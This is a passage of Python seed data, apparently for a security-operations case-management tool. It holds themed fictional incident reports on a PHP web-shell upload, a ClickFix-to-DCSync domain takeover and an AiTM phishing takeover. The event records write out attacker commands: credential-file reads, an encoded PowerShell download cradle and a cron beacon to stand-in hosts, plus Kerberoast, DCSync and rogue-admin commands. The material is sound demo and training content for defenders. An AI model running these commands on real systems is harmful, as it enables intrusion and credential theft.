                "2. Validate WAF virtual patch rules blocking `.php`, `.phtml`, and `.aspx` execution inside `/uploads/`.\n"
                "3. Obtain confirmation from Daystrom Cybernetics Lead (Dr. Maddox) on whether warp-field simulation tables contain classified Starfleet specs.\n"
                "4. Rebuild WEB-LCARS-01 from golden container image after forensic memory preservation."
            ),
            "key_customer_contacts": "Starfleet Cyber Command Duty Officer: subspace-soc@daystrom-institute.example",
            "key_assets_affected": (
                "WEB-LCARS-01 (172.16.47.10 / portal.daystrom-institute.example)\n"
                "IIS-UTOPIA-02 (10.47.20.15)\n"
                "PGSQL-DAYSTROM-01 (10.47.30.50)"
            ),
            "key_users_affected": (
                "www-data (WEB-LCARS-01)\n"
                "UTOPIA\\iis_apphost\n"
                "svc_lcars_portal (PostgreSQL Role)\n"
                "sys_romulan_maint (Created by Attacker)"
            ),
            "key_malicious_indicators": (
                "198.51.100.214\n"
                "203.0.113.77\n"
                "tal-shiar-telemetry.org\n"
                "eps_conduit.php\n"
                "tachyon_relay.aspx\n"
                "/var/www/lcars/uploads/avatars/eps_conduit.php\n"
                "/tmp/.subspace_sync.sh"
            ),
            "status": "INVESTIGATING",
            "lead_analyst": "Jean-Luc Picard",
        },
        "contacts": [
            {
                "name": "Geordi La Forge",
                "role_title": "Chief Infrastructure Engineer, Utopia Planitia",
                "email": "g.laforge@utopia-planitia.example",
                "phone": "+1-555-1701",
                "notes": "Owns WEB-LCARS-01 reverse proxy and IIS-UTOPIA-02 application servers.",
            },
            {
                "name": "Bruce Maddox",
                "role_title": "Associate Chair, Daystrom Research Portal",
                "email": "b.maddox@daystrom-institute.example",
                "phone": "+1-555-4747",
                "notes": "Application owner reviewing uploaded research attachments and database schema sensitivity.",
            },
        ],
        "related_incidents": [
            {
                "title": "WAF-2026-1192: Anomalous Multipart Double-Extension Upload on portal.daystrom-institute.example",
                "link": "https://soc.internal.example/escalations/WAF-2026-1192",
                "analyst_name": "Seven of Nine",
            },
            {
                "title": "EDR-2026-3308: Linux www-data Spawning Interactive /bin/sh & curl",
                "link": "https://soc.internal.example/escalations/EDR-2026-3308",
                "analyst_name": "Jean-Luc Picard",
            },
        ],
        "research": [
            {
                "link": "https://attack.mitre.org/techniques/T1505/003/",
                "summary": "MITRE ATT&CK T1505.003 - Server Software Component: Web Shell persistence & remote command execution.",
                "analyst_name": "Seven of Nine",
            },
            {
                "link": "https://attack.mitre.org/techniques/T1190/",
                "summary": "MITRE ATT&CK T1190 - Exploit Public-Facing Application via unrestricted multipart upload.",
                "analyst_name": "Jean-Luc Picard",
            },
        ],
        "events": [
            {
                "type": EvidenceItem.EVIDENCE_TYPE_SEARCH,
                "analyst": "Seven of Nine",
                "ts": datetime(2026, 10, 21, 8, 12, 0, tzinfo=dt_timezone.utc),
                "end_ts": datetime(2026, 10, 21, 8, 19, 45, tzinfo=dt_timezone.utc),
                "asset": "WEB-LCARS-01 (172.16.47.10)",
                "user": "",
                "attacker_user": False,
                "summary": "Automated directory & endpoint fuzzing (1,840 HTTP requests) from 198.51.100.214 against /api/v2/research/upload.",
                "notes": "Scanner enumerated MIME filter validation behavior on portal.daystrom-institute.example.",
                "indicators": "198.51.100.214",
                "cmd": "",
                "tactic": "Reconnaissance (TA0043)",
                "technique": "T1595.002 - Active Scanning: Vulnerability Scanning",
                "log_link": "",
                "res_link": "https://siem.internal.example/app/discover#/view/lcars-waf-fuzzing",
                "qry_link": "https://siem.internal.example/app/discover#/?_q=(host.name:WEB-LCARS-01%20AND%20source.ip:198.51.100.214)",
                "key": False,
                "shot": None,
            },
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "Jean-Luc Picard",
                "ts": datetime(2026, 10, 21, 8, 22, 14, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "WEB-LCARS-01 (172.16.47.10)",
                "user": "www-data",
                "attacker_user": False,
                "summary": "Unauthenticated multipart POST exploited magic-byte bypass (GIF89a header) to write web shell /var/www/lcars/uploads/avatars/eps_conduit.php.",
                "notes": "HTTP 201 Created returned; file written with executable PHP handler permissions.",
                "indicators": "198.51.100.214, eps_conduit.php, /var/www/lcars/uploads/avatars/eps_conduit.php",
                "cmd": "POST /api/v2/research/upload HTTP/1.1 [filename=\"diagram.gif.php\" -> eps_conduit.php]",
                "tactic": "Initial Access (TA0001); Persistence (TA0003)",
                "technique": "T1190 - Exploit Public-Facing Application; T1505.003 - Server Software Component: Web Shell",
                "log_link": "https://siem.internal.example/events/nginx-access-774102",
                "res_link": "",
                "qry_link": "",
                "key": True,
                "shot": (
                    "lcars_webshell_upload.png",
                    "Nginx & File Integrity Telemetry: Web Shell Upload on WEB-LCARS-01",
                    [
                        "[NGINX] 198.51.100.214 POST /api/v2/research/upload -> 201 Created (4,128 bytes)",
                        "[FIM]   FileCreated: /var/www/lcars/uploads/avatars/eps_conduit.php (uid=www-data)",
                        "[HEAD]  47 49 46 38 39 61 3c 3f 70 68 70 20 40 65 76 61 6c (GIF89a<?php @eval...)",
                    ],
                ),
            },
            {
                "type": EvidenceItem.EVIDENCE_TYPE_SEARCH,
                "analyst": "Seven of Nine",
                "ts": datetime(2026, 10, 21, 8, 24, 30, tzinfo=dt_timezone.utc),
                "end_ts": datetime(2026, 10, 21, 8, 28, 12, tzinfo=dt_timezone.utc),
                "asset": "WEB-LCARS-01 (172.16.47.10)",
                "user": "www-data",
                "attacker_user": False,
                "summary": "19 HTTP POST requests to /uploads/avatars/eps_conduit.php spawned /bin/sh child processes from php-fpm8.2 executing host discovery.",
                "notes": "Linux auditd EXECVE telemetry confirmed base64-encoded command payloads inside POST body.",
                "indicators": "198.51.100.214, eps_conduit.php",
                "cmd": "id; uname -a; ip route; cat /etc/passwd; env",
                "tactic": "Execution (TA0002); Discovery (TA0007)",
                "technique": "T1059.004 - Command and Scripting Interpreter: Unix Shell; T1082 - System Information Discovery",
                "log_link": "",
                "res_link": "https://edr.internal.example/app/LinuxExec#/web-lcars-01-webshell",
                "qry_link": "https://edr.internal.example/app/LinuxExec#/?_q=(parent.executable:*php-fpm*%20AND%20process.name:sh)",
                "key": True,
                "shot": (
                    "php_fpm_webshell_exec.png",
                    "Linux EDR: php-fpm8.2 Spawning /bin/sh via eps_conduit.php",
                    [
                        "[EDR] host=WEB-LCARS-01 ppid=1492(php-fpm8.2) uid=33(www-data)",
                        "08:24:33 UTC | /bin/sh -c 'id && uname -a && ip addr show'",
                        "08:26:19 UTC | /bin/sh -c 'find /var/www -maxdepth 3 -name *.env -o -name *config*'",
                    ],
                ),
            },
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "Geordi La Forge",
                "ts": datetime(2026, 10, 21, 8, 29, 50, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "WEB-LCARS-01 (172.16.47.10)",
                "user": "www-data",
                "attacker_user": False,
                "summary": "Attacker read /var/www/lcars/.env and /etc/lcars/partner_sync.conf, harvesting PostgreSQL credentials and Utopia Planitia API deploy key.",
                "notes": "Extracted DB password for svc_lcars_portal and internal WebDAV publishing credentials for IIS-UTOPIA-02.",
                "indicators": "/var/www/lcars/.env",
                "cmd": "cat /var/www/lcars/.env /etc/lcars/partner_sync.conf",
                "tactic": "Credential Access (TA0006)",
                "technique": "T1552.001 - Unsecured Credentials: Credentials In Files",
                "log_link": "https://edr.internal.example/events/auditd-991204",
                "res_link": "",
                "qry_link": "",
                "key": True,
                "shot": None,
            },
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "Geordi La Forge",
                "ts": datetime(2026, 10, 21, 8, 35, 18, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "IIS-UTOPIA-02 (10.47.20.15)",
                "user": "UTOPIA\\iis_apphost",
                "attacker_user": False,
                "summary": "Secondary ASPX web shell tachyon_relay.aspx uploaded to IIS-UTOPIA-02 via stolen internal WebDAV deployment credentials.",
                "notes": "w3wp.exe subsequently spawned cmd.exe /c whoami /priv on IIS-UTOPIA-02.",
                "indicators": "172.16.47.10, 10.47.20.15, tachyon_relay.aspx",
                "cmd": "curl -u iis_apphost:*** -T /tmp/tachyon_relay.aspx http://10.47.20.15/ diagnostics/tachyon_relay.aspx",
                "tactic": "Lateral Movement (TA0008); Persistence (TA0003)",
                "technique": "T1021.006 - Remote Services: Windows Remote Management; T1505.003 - Server Software Component: Web Shell",
                "log_link": "https://siem.internal.example/events/iis-w3wp-448210",
                "res_link": "",
                "qry_link": "",
                "key": True,
                "shot": (
                    "utopia_secondary_aspx_webshell.png",
                    "Windows EDR: w3wp.exe Spawning cmd.exe from tachyon_relay.aspx",
                    [
                        "[EDR] host=IIS-UTOPIA-02 ParentImage=C:\\Windows\\System32\\inetsrv\\w3wp.exe",
                        "WebRootFile: C:\\inetpub\\wwwroot\\diagnostics\\tachyon_relay.aspx",
                        "$ cmd.exe /c \"whoami /all & netstat -ano & dir C:\\FleetSpecs\"",
                    ],
                ),
            },
            {
                "type": EvidenceItem.EVIDENCE_TYPE_SEARCH,
                "analyst": "Seven of Nine",
                "ts": datetime(2026, 10, 21, 8, 41, 0, tzinfo=dt_timezone.utc),
                "end_ts": datetime(2026, 10, 21, 8, 46, 22, tzinfo=dt_timezone.utc),
                "asset": "PGSQL-DAYSTROM-01 (10.47.30.50)",
                "user": "svc_lcars_portal",
                "attacker_user": False,
                "summary": "psql client invoked from WEB-LCARS-01 dumped subspace_transceiver_specs and researcher_directory tables to /tmp/daystrom_dump.sql.gz.",
                "notes": "PostgreSQL audit logs recorded COPY TO STDOUT for 6,410 rows.",
                "indicators": "10.47.30.50, /tmp/daystrom_dump.sql.gz",
                "cmd": "PGPASSWORD=*** pg_dump -h 10.47.30.50 -U svc_lcars_portal -t subspace_transceiver_specs lcars_prod | gzip > /tmp/daystrom_dump.sql.gz",
                "tactic": "Collection (TA0009)",
                "technique": "T1005 - Data from Local System; T1560.001 - Archive Collected Data: Archive via Utility",
                "log_link": "",
                "res_link": "https://siem.internal.example/app/discover#/view/pgsql-audit-copy",
                "qry_link": "https://siem.internal.example/app/discover#/?_q=(host.name:PGSQL-DAYSTROM-01%20AND%20db.user:svc_lcars_portal)",
                "key": True,
                "shot": None,
            },
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "Jean-Luc Picard",
                "ts": datetime(2026, 10, 21, 8, 49, 5, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "WEB-LCARS-01 (172.16.47.10)",
                "user": "sys_romulan_maint",
                "attacker_user": True,
                "summary": "User crontab persistence added for www-data calling /tmp/.subspace_sync.sh to beacon to tal-shiar-telemetry.org (203.0.113.77).",
                "notes": "Outbound curl callback blocked by egress DNS sinkhole; web shells quarantined and hosts isolated.",
                "indicators": "203.0.113.77, tal-shiar-telemetry.org, /tmp/.subspace_sync.sh",
                "cmd": "(crontab -l; echo '*/10 * * * * /bin/sh /tmp/.subspace_sync.sh') | crontab -",
                "tactic": "Persistence (TA0003); Command and Control (TA0011)",
                "technique": "T1053.003 - Scheduled Task/Job: Cron; T1071.001 - Application Layer Protocol: Web Protocols",
                "log_link": "https://edr.internal.example/events/auditd-991890",
                "res_link": "",
                "qry_link": "",
                "key": False,
                "shot": None,
            },
        ],
    }


def _get_matrix_spec() -> dict:
    return {
        "project": {
            "title": "ClickFix Fake Verification Compromise Escalating to Domain Controller Takeover",
            "customer_name": "MetaCortex Software Corporation",
            "customer_id": "CUST-19990",
            "ticket_id": "SOC-2026-0101",
            "ticket_link": "https://soc.internal.example/tickets/SOC-2026-0101",
            "summary": (
                "Developer workstation WKS-NEO-101 (user METACORTEX\\t.anderson) visited a typosquatted documentation "
                "site displaying a fraudulent browser 'Human Verification' ClickFix modal that copied a malicious command "
                "to the clipboard and instructed the user to press Win+R, Ctrl+V, and Enter. This executed mshta.exe and "
                "an obfuscated PowerShell memory loader establishing C2 to 192.0.2.199 (sentinel-matrix-cdn.net). Within "
                "48 minutes, the threat actor Kerberoasted service account METACORTEX\\svc_zion_sql, cracked the TGS offline, "
                "pivoted via SMB/WMI to Tier-0 jump host ADM-NEBUCHADNEZZAR-01, harvested Domain Admin credentials, performed "
                "a DCSync replication attack against DC-ARCHITECT-01, and created rogue Enterprise Admin account METACORTEX\\agent_smith."
            ),
            "action_plan": (
                "1. Execute full Active Directory forest recovery procedure: disable `agent_smith`, revoke active Kerberos TGTs, and perform double `krbtgt` reset.\n"
                "2. Push GPO blocking `mshta.exe` outbound network traffic and disabling Windows Run dialog (`NoRun`) for standard workstation OUs.\n"
                "3. Re-image WKS-NEO-101 and ADM-NEBUCHADNEZZAR-01 after RAM & MFT acquisition.\n"
                "4. Confirm with MetaCortex Legal & CISO whether source code repositories on GIT-ZION-01 were accessed after DC takeover."
            ),
            "key_customer_contacts": "MetaCortex Security Operations Bridge: ext. 101 / soc-bridge@metacortex.example",
            "key_assets_affected": (
                "WKS-NEO-101 (10.99.14.101)\n"
                "ADM-NEBUCHADNEZZAR-01 (10.99.2.15)\n"
                "DC-ARCHITECT-01 (10.99.0.10)"
            ),
            "key_users_affected": (
                "METACORTEX\\t.anderson\n"
                "METACORTEX\\svc_zion_sql\n"
                "METACORTEX\\adm_morpheus\n"
                "METACORTEX\\agent_smith (Created by Attacker)"
            ),
            "key_malicious_indicators": (
                "192.0.2.199\n"
                "198.51.100.88\n"
                "verify-human-check-docs.com\n"
                "sentinel-matrix-cdn.net\n"
                "white_rabbit.hta\n"
                "cypher_beacon.dll"
            ),
            "status": "CONTAINED",
            "lead_analyst": "Trinity",
        },
        "contacts": [
            {
                "name": "Thomas Anderson",
                "role_title": "Senior Systems Programmer (Initial Patient Zero)",
                "email": "t.anderson@metacortex.example",
                "phone": "+1-555-0101",
                "notes": "Confirmed encountering fake Cloudflare verification prompt while researching API docs.",
            },
            {
                "name": "Jason Rhineheart",
                "role_title": "VP of Enterprise Engineering, MetaCortex",
                "email": "j.rhineheart@metacortex.example",
                "phone": "+1-555-0190",
                "notes": "Executive sponsor approving emergency forest-wide password & KRBTGT rotation.",
            },
        ],
        "related_incidents": [
            {
                "title": "EDR-2026-9901: Explorer.exe RunMRU Spawning mshta.exe & Encoded PowerShell on WKS-NEO-101",
                "link": "https://soc.internal.example/escalations/EDR-2026-9901",
                "analyst_name": "Tank",
            },
            {
                "title": "AD-CRIT-2026-0044: Non-DC Directory Replication (DCSync EID 4662) Against DC-ARCHITECT-01",
                "link": "https://soc.internal.example/escalations/AD-CRIT-2026-0044",
                "analyst_name": "Trinity",
            },
        ],
        "research": [
            {
                "link": "https://attack.mitre.org/techniques/T1204/004/",
                "summary": "MITRE ATT&CK T1204.004 - User Execution: Malicious Copy and Paste (ClickFix Fake Captcha Lure).",
                "analyst_name": "Trinity",
            },
            {
                "link": "https://attack.mitre.org/techniques/T1003/006/",
                "summary": "MITRE ATT&CK T1003.006 - OS Credential Dumping: DCSync via MS-DRSR GetNCChanges.",
                "analyst_name": "Morpheus",
            },
        ],
        "events": [
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "Tank",
                "ts": datetime(2026, 10, 24, 14, 5, 19, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "WKS-NEO-101 (10.99.14.101)",
                "user": "METACORTEX\\t.anderson",
                "attacker_user": False,
                "summary": "ClickFix execution detected: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU recorded mshta.exe payload pasted via Win+R.",
                "notes": "Browser history shows visit to verify-human-check-docs.com 11 seconds prior to Run dialog execution.",
                "indicators": "verify-human-check-docs.com, 198.51.100.88, white_rabbit.hta",
                "cmd": 'mshta.exe https://verify-human-check-docs.com/check/white_rabbit.hta # "I am not a robot - Verification ID: 8941"',
                "tactic": "Initial Access (TA0001); Execution (TA0002); Defense Evasion (TA0005)",
                "technique": "T1204.004 - User Execution: Malicious Copy and Paste; T1218.005 - System Binary Proxy Execution: Mshta",
                "log_link": "https://edr.internal.example/events/neo-runmru-10041",
                "res_link": "",
                "qry_link": "",
                "key": True,
                "shot": (
                    "clickfix_runmru_mshta.png",
                    "EDR Process Tree & Registry RunMRU: ClickFix Execution on WKS-NEO-101",
                    [
                        "[REG] HKCU\\...\\Explorer\\RunMRU\\a = mshta.exe https://verify-human-check-docs.com/check/white_rabbit.hta\\1",
                        "[EDR] explorer.exe -> mshta.exe -> powershell.exe -w hidden -nop -enc SQBFAFgAKABOAGUAdwAt...",
                        "User=METACORTEX\\t.anderson | Host=WKS-NEO-101 (10.99.14.101)",
                    ],
                ),
            },
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "Trinity",
                "ts": datetime(2026, 10, 24, 14, 7, 2, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "WKS-NEO-101 (10.99.14.101)",
                "user": "METACORTEX\\t.anderson",
                "attacker_user": False,
                "summary": "mshta.exe spawned hidden PowerShell loader injecting cypher_beacon.dll into rundll32.exe and establishing HTTPS C2 to sentinel-matrix-cdn.net.",
                "notes": "Jittered 5-second HTTPS beacon observed to 192.0.2.199:443.",
                "indicators": "192.0.2.199, sentinel-matrix-cdn.net, cypher_beacon.dll",
                "cmd": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwAHMAOgAvAC8AcwBlAG4AdABpAG4AZQBsAC0AbQBhAHQAcgBpAHgALQBjAGQAbgAuAG4AZQB0AC8AcwB0AGEAZwBlADIAIgApAA==",
                "tactic": "Execution (TA0002); Command and Control (TA0011)",
                "technique": "T1059.001 - Command and Scripting Interpreter: PowerShell; T1071.001 - Application Layer Protocol: Web Protocols",
                "log_link": "https://edr.internal.example/events/neo-ps-c2-10089",
                "res_link": "",
                "qry_link": "",
                "key": False,
                "shot": None,
            },
            {
                "type": EvidenceItem.EVIDENCE_TYPE_SEARCH,
                "analyst": "Morpheus",
                "ts": datetime(2026, 10, 24, 14, 15, 0, tzinfo=dt_timezone.utc),
                "end_ts": datetime(2026, 10, 24, 14, 18, 40, tzinfo=dt_timezone.utc),
                "asset": "DC-ARCHITECT-01 (10.99.0.10)",
                "user": "METACORTEX\\t.anderson",
                "attacker_user": False,
                "summary": "Kerberoasting attack (Event ID 4769 with RC4 0x17 encryption) requested 14 SPN service tickets from WKS-NEO-101, including svc_zion_sql.",
                "notes": "svc_zion_sql had local admin rights on jump host ADM-NEBUCHADNEZZAR-01 and used a legacy 10-character password.",
                "indicators": "10.99.14.101",
                "cmd": "Invoke-Kerberoast -OutputFormat Hashcat | Select-Object SamAccountName, Hash",
                "tactic": "Credential Access (TA0006)",
                "technique": "T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting",
                "log_link": "",
                "res_link": "https://siem.internal.example/app/discover#/view/kerberoast-eid4769-rc4",
                "qry_link": "https://siem.internal.example/app/discover#/?_q=(event.code:4769%20AND%20TicketEncryptionType:0x17%20AND%20source.ip:10.99.14.101)",
                "key": True,
                "shot": (
                    "matrix_kerberoast_4769.png",
                    "SIEM Kerberos Audit: RC4 TGS Ticket Sweep (Event ID 4769)",
                    [
                        "[SIEM] host=DC-ARCHITECT-01 EventID=4769 Encryption=0x17(RC4-HMAC) Client=10.99.14.101",
                        "14:15:12 UTC | ServiceName=MSSQLSvc/zion-db.metacortex.local | Target=svc_zion_sql",
                        "Total SPN Tickets Requested in 90s Window: 14",
                    ],
                ),
            },
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "Trinity",
                "ts": datetime(2026, 10, 24, 14, 34, 11, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "ADM-NEBUCHADNEZZAR-01 (10.99.2.15)",
                "user": "METACORTEX\\svc_zion_sql",
                "attacker_user": False,
                "summary": "Lateral movement via WMI Win32_Process Create from WKS-NEO-101 to Tier-0 admin jump host ADM-NEBUCHADNEZZAR-01 using cracked svc_zion_sql credentials.",
                "notes": "Attacker subsequently stole an active Domain Admin token (METACORTEX\\adm_morpheus) from LSASS on the jump host.",
                "indicators": "10.99.14.101, 10.99.2.15, cypher_beacon.dll",
                "cmd": "wmic /node:10.99.2.15 /user:METACORTEX\\svc_zion_sql process call create \"rundll32.exe C:\\Windows\\Temp\\cypher_beacon.dll,Start\"",
                "tactic": "Lateral Movement (TA0008); Execution (TA0002)",
                "technique": "T1047 - Windows Management Instrumentation; T1021.002 - Remote Services: SMB/Windows Admin Shares",
                "log_link": "https://edr.internal.example/events/wmiprvse-neb-44102",
                "res_link": "",
                "qry_link": "",
                "key": True,
                "shot": None,
            },
            {
                "type": EvidenceItem.EVIDENCE_TYPE_SEARCH,
                "analyst": "Morpheus",
                "ts": datetime(2026, 10, 24, 14, 48, 5, tzinfo=dt_timezone.utc),
                "end_ts": datetime(2026, 10, 24, 14, 50, 12, tzinfo=dt_timezone.utc),
                "asset": "DC-ARCHITECT-01 (10.99.0.10)",
                "user": "METACORTEX\\adm_morpheus",
                "attacker_user": False,
                "summary": "DCSync directory replication (Event ID 4662 DS-Replication-Get-Changes-All) executed from non-DC host ADM-NEBUCHADNEZZAR-01 against DC-ARCHITECT-01.",
                "notes": "Full domain password hashes including krbtgt replicated via MS-DRSR protocol — complete Active Directory takeover confirmed.",
                "indicators": "10.99.2.15, 10.99.0.10",
                "cmd": "lsadump::dcsync /domain:metacortex.local /all /csv",
                "tactic": "Credential Access (TA0006)",
                "technique": "T1003.006 - OS Credential Dumping: DCSync",
                "log_link": "",
                "res_link": "https://siem.internal.example/app/discover#/view/dcsync-architect-4662",
                "qry_link": "https://siem.internal.example/app/discover#/?_q=(host.name:DC-ARCHITECT-01%20AND%20event.code:4662%20AND%20Properties:*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*)",
                "key": True,
                "shot": (
                    "dcsync_dc_takeover.png",
                    "Domain Controller Audit: DCSync Replication (EID 4662) on DC-ARCHITECT-01",
                    [
                        "[SIEM] host=DC-ARCHITECT-01 EventID=4662 SubjectUserName=adm_morpheus",
                        "SourceWorkstation=ADM-NEBUCHADNEZZAR-01 (10.99.2.15) [NON-DOMAIN-CONTROLLER]",
                        "AccessMask=0x100 | GUID={1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} (Get-Changes-All)",
                    ],
                ),
            },
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "Trinity",
                "ts": datetime(2026, 10, 24, 14, 52, 33, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "DC-ARCHITECT-01 (10.99.0.10)",
                "user": "METACORTEX\\agent_smith",
                "attacker_user": True,
                "summary": "Rogue account METACORTEX\\agent_smith created on DC-ARCHITECT-01 and added to both Domain Admins and Enterprise Admins (Event IDs 4720, 4728).",
                "notes": "Account disabled during emergency containment at 15:08 UTC alongside host network quarantine.",
                "indicators": "10.99.0.10",
                "cmd": 'net user agent_smith Inevitable#1999 /add /domain && net group "Enterprise Admins" agent_smith /add /domain',
                "tactic": "Persistence (TA0003); Privilege Escalation (TA0004)",
                "technique": "T1136.002 - Create Account: Domain Account; T1078.002 - Valid Accounts: Domain Accounts",
                "log_link": "https://siem.internal.example/events/dc-eid4720-agent-smith",
                "res_link": "",
                "qry_link": "",
                "key": True,
                "shot": None,
            },
        ],
    }


def _get_star_wars_spec() -> dict:
    return {
        "project": {
            "title": "Adversary-in-the-Middle (MitM) Phishing Leading to Mass Spam Wave & Multi-Account Takeover",
            "customer_name": "Corellian Engineering Corporation",
            "customer_id": "CUST-32700",
            "ticket_id": "SOC-2026-3277",
            "ticket_link": "https://soc.internal.example/tickets/SOC-2026-3277",
            "summary": (
                "Finance Director Lando Calrissian (l.calrissian@corellia-eng.example) clicked a spear-phishing link "
                "impersonating Kuat Drive Yards procurement and authenticated through an Evilginx-style Adversary-in-the-Middle "
                "(MitM) reverse proxy hosted at sso-corellia-auth.net (203.0.113.195). The proxy intercepted both credentials "
                "and post-MFA session cookies, enabling session replay from 198.51.100.42. The attacker enrolled a rogue "
                "TOTP MFA device, created hidden Exchange inbox rules moving bounce/reply warnings to RSS Subscriptions, "
                "and launched a 486-recipient internal and partner phishing spam wave. Three additional Corellian accounts "
                "(w.antilles, m.mothma, and h.solo) fell victim to the internal MitM wave before tenant-wide session revocation."
            ),
            "action_plan": (
                "1. Purge remaining 486 internal/partner phishing messages via Microsoft Purview / Exchange Search-Mailbox.\n"
                "2. Audit all mailboxes for hidden Inbox Rules (`MoveToFolder: RSS Subscriptions` / `DeleteMessage`) and rogue OAuth apps.\n"
                "3. Confirm with Kuat Drive Yards AP team that no wire transfers were initiated from spoofed invoice emails sent by `m.mothma`.\n"
                "4. Enforce token-binding / Continuous Access Evaluation (CAE) and phishing-resistant Passkeys/FIDO2 for Finance & Executive groups."
            ),
            "key_customer_contacts": "Corellian Cloud Identity & Messaging Team: identity-ops@corellia-eng.example",
            "key_assets_affected": (
                "M365-TENANT-CORELLIA (corellia-eng.example)\n"
                "EXO-MAILBOX-LCALRISSIAN\n"
                "EXO-MAILBOX-WANTILLES\n"
                "EXO-MAILBOX-MMOTHMA\n"
                "EXO-MAILBOX-HSOLO\n"
                "SPO-HYPERDRIVE-PROCUREMENT"
            ),
            "key_users_affected": (
                "l.calrissian@corellia-eng.example\n"
                "w.antilles@corellia-eng.example\n"
                "m.mothma@corellia-eng.example\n"
                "h.solo@corellia-eng.example"
            ),
            "key_malicious_indicators": (
                "203.0.113.195\n"
                "198.51.100.42\n"
                "192.0.2.84\n"
                "sso-corellia-auth.net\n"
                "kuat-invoice-portal.com\n"
                "https://sso-corellia-auth.net/common/oauth2/authorize"
            ),
            "status": "INVESTIGATING",
            "lead_analyst": "Leia Organa",
        },
        "contacts": [
            {
                "name": "Mon Mothma",
                "role_title": "Chief Financial Officer, Corellian Engineering",
                "email": "m.mothma@corellia-eng.example",
                "phone": "+1-555-3271",
                "notes": "Executive stakeholder & impacted mailbox owner; coordinating partner BEC notifications.",
            },
            {
                "name": "Wedge Antilles",
                "role_title": "Lead Cloud Identity Architect",
                "email": "w.antilles@corellia-eng.example",
                "phone": "+1-555-3279",
                "notes": "Restored after MFA reset; assisting with Conditional Access token-protection rollout.",
            },
        ],
        "related_incidents": [
            {
                "title": "IDP-2026-7710: Impossible Travel & Session Cookie Replay on l.calrissian",
                "link": "https://soc.internal.example/escalations/IDP-2026-7710",
                "analyst_name": "Cassian Andor",
            },
            {
                "title": "MAIL-2026-7724: Outbound Phishing Spam Burst (486 Messages) from Compromised Tenant Mailboxes",
                "link": "https://soc.internal.example/escalations/MAIL-2026-7724",
                "analyst_name": "Ahsoka Tano",
            },
        ],
        "research": [
            {
                "link": "https://attack.mitre.org/techniques/T1557/",
                "summary": "MITRE ATT&CK T1557 & T1539 - Adversary-in-the-Middle Reverse Proxy Phishing & Web Session Cookie Theft.",
                "analyst_name": "Leia Organa",
            },
            {
                "link": "https://attack.mitre.org/techniques/T1564/008/",
                "summary": "MITRE ATT&CK T1564.008 - Hide Artifacts: Email Hiding Rules in compromised cloud mailboxes.",
                "analyst_name": "Ahsoka Tano",
            },
        ],
        "events": [
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "Cassian Andor",
                "ts": datetime(2026, 10, 26, 11, 4, 12, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "EXO-MAILBOX-LCALRISSIAN",
                "user": "l.calrissian@corellia-eng.example",
                "attacker_user": False,
                "summary": "Spear-phishing email from billing@kuat-invoice-portal.com delivered link to AiTM reverse proxy https://sso-corellia-auth.net/common/oauth2/authorize.",
                "notes": "User clicked URL and completed Number Matching MFA through the Evilginx reverse proxy hosted at 203.0.113.195.",
                "indicators": "203.0.113.195, kuat-invoice-portal.com, sso-corellia-auth.net, https://sso-corellia-auth.net/common/oauth2/authorize",
                "cmd": "",
                "tactic": "Initial Access (TA0001); Credential Access (TA0006)",
                "technique": "T1566.002 - Phishing: Spearphishing Link; T1557 - Adversary-in-the-Middle",
                "log_link": "https://siem.internal.example/events/mdo-urlclick-66102",
                "res_link": "",
                "qry_link": "",
                "key": True,
                "shot": (
                    "starwars_aitm_proxy_login.png",
                    "Entra ID Sign-In Telemetry: AiTM Proxy Auth & Session Replay",
                    [
                        "[IDP] 11:05:02 UTC | user=l.calrissian | src_ip=203.0.113.195 (AiTM Proxy) | MFA=Success",
                        "[IDP] 11:06:49 UTC | user=l.calrissian | src_ip=198.51.100.42 (ASN-VPS)    | TokenReplay=ESTSAUTH",
                        "SessionId=9b77c210-4a12 | UserAgent=Mozilla/5.0 (X11; Linux x86_64)",
                    ],
                ),
            },
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "Leia Organa",
                "ts": datetime(2026, 10, 26, 11, 8, 30, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "M365-TENANT-CORELLIA",
                "user": "l.calrissian@corellia-eng.example",
                "attacker_user": False,
                "summary": "Stolen ESTSAUTHPERSISTENT session cookie replayed from 198.51.100.42 to register a rogue Software OATH MFA token and create stealth Exchange inbox rule '_sav_sync'.",
                "notes": "Inbox rule moved any incoming emails containing 'phish', 'hacked', 'fraud', or 'undeliverable' to RSS Subscriptions and marked them read.",
                "indicators": "198.51.100.42",
                "cmd": "New-InboxRule -Name '_sav_sync' -SubjectOrBodyContainsWords 'phish','hacked','fraud','undeliverable' -MoveToFolder 'RSS Subscriptions' -MarkAsRead $true",
                "tactic": "Credential Access (TA0006); Persistence (TA0003); Defense Evasion (TA0005)",
